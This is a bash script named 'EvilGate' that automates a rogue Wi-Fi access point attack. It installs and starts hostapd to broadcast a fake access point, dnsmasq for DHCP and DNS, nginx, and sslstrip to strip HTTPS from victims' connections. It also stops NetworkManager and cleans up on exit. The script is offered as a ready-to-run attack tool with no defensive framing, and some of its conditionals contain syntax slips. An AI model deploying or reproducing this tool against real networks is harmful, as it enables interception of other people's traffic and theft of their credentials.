#!/usr/bin/bash
# EvilGate by Pascal3366

Exit() {
  echo "Cleaning up stuff..."
  killall hostapd
  killall sslstrip
  stop_service "nginx"
  start_service "NetworkManager"
  exit
}

trap Exit SIGINT

if [ "$EUID" -ne 0 ]
  then echo "This script has to be run as root"
  exit
fi

SSLSTRIP_PORT=10000

detect_init() {
  # init process is pid 1
  INIT=`ls -l /proc/1/exe`
  if [[ $INIT == *"upstart"* ]]; then
    SYSTEMINITDAEMON=upstart
  elif [[ $INIT == *"systemd"* ]]; then
    SYSTEMINITDAEMON=systemd
  elif [[ $INIT == *"/sbin/init"* ]]; then
    INIT=`/sbin/init --version`
    if [[ $INIT == *"upstart"* ]]; then
      SYSTEMINITDAEMON=upstart
    elif [[ $INIT == *"systemd"* ]]; then
      SYSTEMINITDAEMON=systemd
    fi
  fi

  if [ -z "$SYSTEMINITDAEMON" ]; then
    echo "WARNING: Unknown distribution, assuming defaults - this may fail." >&2
  fi
}

detect_package_manager() {
  if [ -f /usr/bin/pacman ]; then
    PACKAGEMANAGER=pacman
  elif [ -f /usr/bin/apt ]; then
    PACKAGEMANAGER=apt
  elif [ -f /usr/bin/yum ]; then
    PACKAGEMANAGER=yum
  elif [ -f /usr/bin/dnf ]; then
    PACKAGEMANAGER=dnf
  elif [ -f /usr/bin/emerge ]; then
    PACKAGEMANAGER=portage
  fi
}

install_package() {
  if [ "$PACKAGEMANAGER" = "pacman" ]; then
    pacman -S $1
  elif [ "$PACKAGEMANAGER" = "apt" ]; then
    apt install $1
  elif [ "$PACKAGEMANAGER" = "yum" ]; then
    yum install $1
  elif [ "$PACKAGEMANAGER" = "dnf" ]; then
    dnf install $1
  elif [ "$PACKAGEMANAGER" = "portage" ]; then
    emerge $1
  fi
}

check_requirements() {
  if [ -f /usr/bin/hostapd ]; then
    echo "[hostapd]: installed"
    HOSTAPD=true
  else
    echo "[hostapd]: missing"
    HOSTAPD=false
  fi

  if [ -f /usr/bin/nginx ]; then
    echo "[nginx]: installed"
    NGINX=true
  else
    echo "[nginx]: missing"
    NGINX=false
  fi

  if [ -f /usr/bin/sslstrip ]; then
    echo "[sslstrip]: installed"
    SSLSTRIP=true
  else
    echo "[sslstrip]: missing"
    SSLSTRIP=false
  fi
}

install_requirements() {
  if [ "$HOSTAPD" = false ]; then
    echo "Installing hostapd..."
    install_package "hostapd"
  fi

  if [ "$NGINX" = false ]; then
    echo "Installing nginx..."
    install_package "nginx"
  fi

  if [ "$SSLSTRIP" = false ]; then
    echo "Installing sslstrip..."
    install_package "sslstrip"
  fi
}

start_service() {
  if [ "$SYSTEMINITDAEMON" = "systemd" ]; then
    systemctl start $1
  elif ["$SYSTEMINITDAEMON" = "upstart" ]; then
    /etc/init.d/$1 start
  fi
}

stop_service() {
  if [ "$SYSTEMINITDAEMON" = "systemd" ]; then
    systemctl stop $1
  elif ["$SYSTEMINITDAEMON" = "upstart" ]; then
    /etc/init.d/$1 stop
  fi
}

detect_init
detect_package_manager

echo "Detected Init System:" $SYSTEMINITDAEMON
echo "Detected Package Manager:" $PACKAGEMANAGER
echo "Checking Requirements..."
check_requirements
echo "Installing missing Requirements..."
install_requirements
echo "Starting nginx"
start_service "nginx"
echo "Starting sslstrip"
nohup sslstrip --listen=$SSLSTRIP_PORT &>/dev/null &
echo "Stopping NetworkManager"
stop_service "NetworkManager"
echo "Setting up FakeAP using hostapd..."
nohup hostapd -B -d hostapd.conf &>/dev/null &
echo "Launching DHCP + DNS Server dnsmasq..."
nohup dnsmasq -C dnsmasq.conf &>/dev/null &

read -p "Script is running press any key to cancel..."

Exit
